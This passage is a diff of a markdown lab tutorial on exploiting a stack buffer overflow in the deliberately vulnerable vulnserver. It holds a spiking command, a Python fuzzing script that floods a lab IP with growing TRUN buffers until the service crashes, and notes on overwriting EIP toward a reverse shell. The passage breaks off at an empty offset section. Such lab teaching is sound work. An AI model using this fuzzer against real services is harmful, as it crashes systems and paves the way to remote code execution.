@@ -89,19 +89,18 @@ $ generic_send_tcp 192.168.17.134 9999 trun.spk 0 0
 
 ![spiking_srcshot](https://github.com/slythx/bufferoverflow/blob/master/vulnserver/img/spiking_srcshot.png) 
 
-Note:
 >**Q: How and why the system crashed?** \
->**A:** By sending bunch of As, to the stack buffer. The stack buffer (EAX register) over flows and we successfully allocated As to the Base Pointer (EBP) and Instruction Pointer (EIP). We can see that EBP and EIP values are all 41414141
+>A: By sending bunch of As, to the stack buffer. The stack buffer (EAX register) over flows and we successfully allocated As to the Base Pointer (EBP) and Instruction Pointer (EIP). We can see that EBP and EIP values are all 41414141
 
 
 >**Q: What is EIP and why it is very important to understand?** \
->**A:** The Instruction Pointer (IP) is where the actual command executes!! So, if we can overwrite this, we can send malicious code and gain reverse shell.
+>A: The Instruction Pointer (IP) is where the actual command executes!! So, if we can overwrite this, we can send malicious code and gain reverse shell.
 
 ## II. Fuzzing
 
 1. We will automate the sending of bunch of As using python script. Make a python2 script ‘fuzz.py’ and copy paste this script.
 
-fuzz.py
+>fuzz.py
 
 ````python
 #!/usr/bin/python
@@ -115,7 +114,6 @@ while True:
 		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		s.connect(('192.168.17.134', 9999))
 
-
 		s.send(('TRUN /.:/' + buffer))
 		s.close()
 		sleep(1) 
@@ -126,6 +124,69 @@ while True:
 		sys.exit()
 
 ````
+
+> Dont forget to change its permission to executable. 
+
+```
+$ chmod +x fuzz.py
+```
+
+>**Q: What does this code do?**
+>A: The script sends 100 As to the vulnserver then it adds another 100 As, so the buffers grows every iteration until it crash.
+
+2. Close and re-run the **IMD** and **vulnserver.exe**. Re-attach vulnserver to IMD then hit the Run button. Makse sure the status is '**Runing**'.
+
+3. Run the python2 script:
+
+```
+$ ./fuzz.py
+```
+
+4. Observe the **IMD** and wait for it to crash then immediately terminate the fuzz.py script by pressing **CTRL + C**. \
+   We can see in the **IMD* that the vulserver crash by checking its status to **Paused** and also we see again the bunch of As in the **Registers** section.
+
+![fuzzing_crashed](https://github.com/slythx/bufferoverflow/blob/master/vulnserver/img/fuzzing_crashed.png)
+
+5. We see that the vulnserver crashed at around 2200 bytes. So the Offset must be less than 2200 bytes. \
+   If you CTRL + C and your result is not 2200 bytes, that's okay because the Offset must be less than what you get in the result.
+
+## III. Finding the Offset
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
